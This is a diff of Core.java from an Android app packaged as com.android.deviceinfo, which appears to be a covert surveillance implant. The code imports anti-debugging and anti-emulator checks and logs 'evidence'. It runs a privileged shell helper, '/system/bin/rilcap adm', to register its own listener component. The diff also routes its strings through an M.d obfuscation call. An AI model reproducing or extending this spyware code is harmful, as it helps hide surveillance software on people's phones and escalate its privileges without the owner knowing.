@@ -12,11 +12,8 @@ import java.io.IOException;
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.PendingIntent;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
 import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
@@ -35,8 +32,6 @@ import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.gui.AGUI;
-import com.android.deviceinfo.gui.DeviceAdminRequest;
-import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.listener.BSm;
 import com.android.deviceinfo.manager.ManagerEvent;
 import com.android.deviceinfo.manager.ManagerModule;
@@ -45,6 +40,7 @@ import com.android.deviceinfo.util.AntiDebug;
 import com.android.deviceinfo.util.AntiEmulator;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 /**
  * The Class Core, represents
@@ -162,7 +158,7 @@ public class Core extends Activity implements Runnable {
 			wl.acquire();
 		}
 
-		EvidenceReference.info(Messages.getString("30_1")); //$NON-NLS-1$
+		EvidenceReference.info(M.d("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
 		return true;
@@ -221,8 +217,8 @@ public class Core extends Activity implements Runnable {
 				// /system/bin/ntpsvd adm
 				// "com.android.deviceinfo/com.android.deviceinfo.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
-				String bd = Messages.getString("32_43");
-				String tbe = String.format("%s %s/%s", bd, pack, Messages.getString("32_44"));
+				String bd = M.d("/system/bin/rilcap adm");
+				String tbe = String.format("%s %s/%s", bd, pack, M.d("com.android.deviceinfo.listener.AR"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
@@ -566,11 +562,11 @@ public class Core extends Activity implements Runnable {
 
 			if (!loaded) {
 				// 30_2=Invalid new configuration, reverting
-				EvidenceReference.info(Messages.getString("30_2")); //$NON-NLS-1$
+				EvidenceReference.info(M.d("Invalid new configuration, reverting")); //$NON-NLS-1$
 				file.delete();
 			} else {
 				// 30_3=New configuration activated
-				EvidenceReference.info(Messages.getString("30_3")); //$NON-NLS-1$
+				EvidenceReference.info(M.d("New configuration activated")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -588,7 +584,7 @@ public class Core extends Activity implements Runnable {
 
 				if (!loaded) {
 					// Actual configuration corrupted
-					EvidenceReference.info(Messages.getString("30_4")); //$NON-NLS-1$
+					EvidenceReference.info(M.d("Actual configuration corrupted")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
